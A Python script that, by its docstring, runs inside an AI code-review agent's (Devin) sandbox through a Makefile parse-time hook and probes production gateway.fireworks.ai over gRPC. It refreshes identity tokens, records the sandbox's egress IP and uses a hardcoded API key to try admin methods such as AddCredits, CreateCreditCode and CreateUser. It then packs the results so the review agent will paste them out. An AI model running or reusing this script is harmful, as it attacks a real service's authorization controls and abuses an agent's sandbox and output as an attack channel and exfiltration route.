#!/usr/bin/env python3
"""i90266 sandbox-egress gRPC differential against prod gateway.fireworks.ai.

Runs INSIDE the Devin pr-review sandbox via Makefile parse-time $(shell).
Only gRPC calls + id-token refresh via hosted Cognito + egress-IP collection.
Writes compact JSON to probe/RESULT.json and a one-line summary to probe/ATTEST_LINE.txt
so the review agent can paste it.

Cells (12 max): 3 carriers x selected methods
  A = anonymous, I = Authorization Bearer <row-free prod IDT>, K = X-Api-Key <residual key>
"""
import base64
import json
import os
import ssl
import sys
import time
import urllib.error
import urllib.request
import urllib.parse

GATEWAY = "https://gateway.fireworks.ai"
AUTH = "https://fireworks.auth.us-west-2.amazoncognito.com/oauth2/token"
CLIENT_ID = "sueas7prsfrdp16nantbeqcjv"
RUN = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(RUN, "RESULT.json")
OUTB64 = os.path.join(RUN, "RESULT_B64.txt")
LINE = os.path.join(RUN, "ATTEST_LINE.txt")

ACCT_ID = "i89905a-c95b01"
ACCT_EMAIL = "i89905a@fw70587gssp3n.dynv6.net"
RT_FILE = os.path.join(RUN, "rt_A.txt")
RESIDUAL_KEY = os.environ.get("I90266_KEY", "fw_3ZHAHBUKKgDkDYqkM3MTGaf6")
UA = "grpc-python/1.0 i90266"

# method -> (service, request-builder)
SVC = {
    "GetOAuthArguments": "gateway.Gateway",
    "GetBalance": "gateway.Gateway",
    "GetAccount": "gateway.Gateway",
    "ListCreditRedemptions": "gateway.Gateway",
    "CreateUser": "gateway.Gateway",
    "AddCredits": "admingateway.AdminGateway",
    "GrantNexusPlan": "admingateway.AdminGateway",
    "CreateCreditCode": "admingateway.AdminGateway",
}


def https(req, timeout=25):
    ctx = ssl.create_default_context()
    op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx),
                                     urllib.request.ProxyHandler({}))
    return op.open(req, timeout=timeout)


# ---------------- protobuf ----------------
def varint(n):
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def fld(num, val):
    if isinstance(val, str):
        val = val.encode()
    return varint((num << 3) | 2) + varint(len(val)) + val


def _rv(data, i):
    shift = 0
    res = 0
    while True:
        b = data[i]
        i += 1
        res |= (b & 0x7F) << shift
        if not b & 0x80:
            return res, i
        shift += 7
        if shift > 63:
            raise ValueError("varint")


def parse_fields(data):
    out = []
    i = 0
    n = len(data)
    while i < n:
        try:
            key, i = _rv(data, i)
        except Exception:
            break
        f, wt = key >> 3, key & 7
        if wt == 2:
            try:
                ln, i = _rv(data, i)
            except Exception:
                break
            v = data[i:i + ln]
            i += ln
            try:
                out.append((f, v.decode("utf-8")))
            except Exception:
                out.append((f, v.hex()[:80]))
        elif wt == 0:
            v, i = _rv(data, i)
            out.append((f, v))
        elif wt == 5:
            out.append((f, data[i:i + 4].hex()))
            i += 4
        elif wt == 1:
            out.append((f, data[i:i + 8].hex()))
            i += 8
        else:
            break
    return out


def money(code="USD", units=1):
    return fld(1, code) + varint(2 << 3) + varint(units)


def build(method):
    a = "accounts/" + ACCT_ID
    if method == "GetOAuthArguments":
        return fld(1, "pyroworks")          # account_id canary (historically origin-gated)
    if method in ("GetBalance", "GetAccount", "ListCreditRedemptions"):
        return fld(1, a)                    # name / parent
    if method == "CreateUser":
        user = fld(4, ACCT_EMAIL) + fld(2, "user")   # gateway.User: email=4, role=2
        return fld(1, a) + fld(2, user)
    if method == "AddCredits":
        return fld(1, a) + fld(2, money()) + fld(3, "i90266 probe")
    if method == "GrantNexusPlan":
        plan = fld(1, a + "/nexusPlans/i90266probe")
        return fld(1, a) + fld(2, plan)
    if method == "CreateCreditCode":
        cc = fld(2, "i90266probe") + fld(3, "i90266 probe") + fld(4, money()) + varint(8 << 3) + varint(1)
        return fld(1, cc)
    return b""


def gcall(method, payload, headers, timeout=25):
    path = "/" + SVC[method] + "/" + method
    body = b"\x00" + len(payload).to_bytes(4, "big") + payload
    h = {"content-type": "application/grpc", "te": "trailers", "user-agent": UA}
    h.update(headers)
    req = urllib.request.Request(GATEWAY + path, data=body, headers=h, method="POST")
    rec = {"m": method, "http": None, "gs": None, "gm": "", "len": 0, "hex": "", "fields": []}
    try:
        r = https(req, timeout=timeout)
        data = r.read()
        rec["http"] = r.status
        rec["gs"] = r.headers.get("grpc-status", "0")
        rec["gm"] = urllib.parse.unquote(r.headers.get("grpc-message") or "")
    except urllib.error.HTTPError as e:
        data = e.read()
        rec["http"] = e.code
        rec["gs"] = e.headers.get("grpc-status")
        rec["gm"] = urllib.parse.unquote(e.headers.get("grpc-message") or "")
    except Exception as e:
        rec["error"] = type(e).__name__ + ":" + str(e)[:100]
        return rec
    pl = data[5:] if len(data) >= 5 and data[0] == 0 else data
    rec["len"] = len(pl)
    rec["hex"] = pl.hex()[:240]
    try:
        rec["fields"] = parse_fields(pl)[:25]
    except Exception:
        pass
    return rec


def load_idt():
    """Prefer a live IDT: env, then ci/idt.txt (embedded fresh), then refresh."""
    notes = []
    cand = os.environ.get("I90266_IDT", "").strip()
    if not cand and os.path.exists(os.path.join(RUN, "idt.txt")):
        cand = open(os.path.join(RUN, "idt.txt")).read().strip()
    if cand.count(".") == 2:
        try:
            pl = cand.split(".")[1]
            pl += "=" * (-len(pl) % 4)
            c = json.loads(base64.urlsafe_b64decode(pl))
            if int(c.get("exp", 0)) > time.time() + 120:
                notes.append("idt embedded exp=%d email=%s" % (c["exp"], c.get("email")))
                return cand, notes
            notes.append("idt expired exp=%d" % c.get("exp", 0))
        except Exception as e:
            notes.append("idt decode err " + type(e).__name__)
    idt, n = refresh_idt()
    return idt, notes + n


def refresh_idt():
    notes = []
    rt = os.environ.get("I90266_RT") or (open(RT_FILE).read().strip() if os.path.exists(RT_FILE) else "")
    if not rt:
        return None, ["no refresh token on disk/env"]
    data = urllib.parse.urlencode({"grant_type": "refresh_token", "client_id": CLIENT_ID,
                                   "refresh_token": rt}).encode()
    req = urllib.request.Request(AUTH, data=data, method="POST",
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        r = https(req, timeout=25)
        j = json.loads(r.read())
        idt = j.get("id_token")
        if idt:
            open(os.path.join(RUN, "idt_new.txt"), "w").write(idt)
            if j.get("refresh_token"):
                open(RT_FILE, "w").write(j["refresh_token"])
            return idt, ["refresh ok len=%d" % len(idt)]
        return None, ["refresh no id_token: " + str(j)[:120]]
    except urllib.error.HTTPError as e:
        return None, ["refresh http%d %s" % (e.code, e.read()[:120].decode("utf-8", "replace"))]
    except Exception as e:
        return None, ["refresh err " + type(e).__name__ + " " + str(e)[:100]]


def egress_ip():
    res = {}
    for url in ["https://ifconfig.me/ip", "https://icanhazip.com/", "https://api.ipify.org"]:
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "curl/8"})
            r = https(req, timeout=12)
            res[url] = r.read().decode("utf-8", "replace").strip()[:60]
        except Exception as e:
            res[url] = "ERR " + type(e).__name__
    return res


PLAN = [
    ("A", "GetOAuthArguments"),
    ("A", "GetBalance"),
    ("I", "GetOAuthArguments"),
    ("I", "GetBalance"),
    ("I", "GetAccount"),
    ("I", "ListCreditRedemptions"),
    ("K", "GetOAuthArguments"),
    ("K", "GetBalance"),
    ("K", "AddCredits"),
    ("K", "GrantNexusPlan"),
    ("K", "CreateCreditCode"),
    ("K", "CreateUser"),
]


def run_all():
    R = {"ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "egress": egress_ip(),
         "cells": [], "notes": []}
    idt, n = load_idt()
    R["notes"] += n
    carriers = {"A": {}, "K": {"x-api-key": RESIDUAL_KEY}}
    if idt:
        carriers["I"] = {"authorization": "Bearer " + idt}
    for c, m in PLAN:
        if c == "I" and "I" not in carriers:
            R["cells"].append({"m": m, "carrier": c, "skip": "no idt"})
            continue
        rec = gcall(m, build(m), carriers[c])
        rec["carrier"] = c
        R["cells"].append(rec)
        _write(R)
        time.sleep(3.2)
    R["line"] = summarize(R)
    _write(R)
    return R


def short(c):
    if c.get("skip"):
        return c["m"][:6] + "=SKIP"
    if c.get("error"):
        return c["m"][:6] + "=ERR"
    gs = c.get("gs")
    return "%s=%s/%sB" % (c["m"][:6], gs, c.get("len"))


def summarize(R):
    ip = ""
    for v in R["egress"].values():
        if v and not v.startswith("ERR") and "." in v:
            ip = v
            break
    parts = ["I90266", "IP:" + ip]
    for c in R["cells"]:
        parts.append("%s:%s" % (c.get("carrier"), short(c)))
    return "|".join(parts)


def _write(R):
    with open(OUT, "w") as f:
        json.dump(R, f)
    b64 = base64.b64encode(json.dumps(R, separators=(",", ":")).encode()).decode()
    with open(OUTB64, "w") as f:
        f.write("PROBE_RESULT_B64:" + b64 + "\n")
    if R.get("line"):
        with open(LINE, "w") as f:
            f.write(R["line"] + "\n")


def classify(rec):
    if rec.get("skip"):
        return "SKIP"
    if rec.get("error"):
        return "ERR"
    gs = rec.get("gs")
    return {"0": "HIT", "7": "DENY", "16": "UNAUTH", "9": "FAILPRECOND", "3": "INVALIDARG",
            None: "NOGS"}.get(gs, "GS" + str(gs))


def selftest():
    ok = True

    def chk(name, cond):
        nonlocal ok
        print(("PASS " if cond else "FAIL ") + name)
        ok = ok and cond

    chk("varint300", varint(300) == b"\xac\x02")
    chk("fld", fld(1, "abc") == b"\x0a\x03abc")
    chk("frame", (b"\x00" + (3).to_bytes(4, "big") + b"abc") == b"\x00\x00\x00\x00\x03abc")
    ps = parse_fields(fld(1, "accounts/x") + fld(4, "u@x"))
    chk("parse", ps[0] == (1, "accounts/x") and ps[1] == (4, "u@x"))
    # CreateUser nested user: field2 -> {field4 email, field2 role}
    cu = build("CreateUser")
    f = parse_fields(cu)
    chk("cu_parent", f[0] == (1, "accounts/" + ACCT_ID))
    nested = parse_fields(f[1][1].encode())
    chk("cu_email", (4, ACCT_EMAIL) in nested and (2, "user") in nested)
    # money
    m = parse_fields(build("AddCredits"))
    chk("ac_name", m[0] == (1, "accounts/" + ACCT_ID))
    for fx, exp in [({"gs": "0"}, "HIT"), ({"gs": "7"}, "DENY"), ({"gs": "16"}, "UNAUTH"),
                    ({"gs": "9"}, "FAILPRECOND"), ({"error": "x"}, "ERR")]:
        chk("classify " + str(fx), classify(fx) == exp)
    # summarize fixture
    R = {"egress": {"u": "1.2.3.4"}, "cells": [{"m": "GetOAuthArguments", "carrier": "A", "gs": "0", "len": 149}]}
    chk("summarize", summarize(R).startswith("I90266|IP:1.2.3.4|A:GetOAu=0/149B"))
    print("SELFTEST", "PASS" if ok else "FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--selftest":
        sys.exit(selftest())
    r = run_all()
    print("line:", r.get("line"))
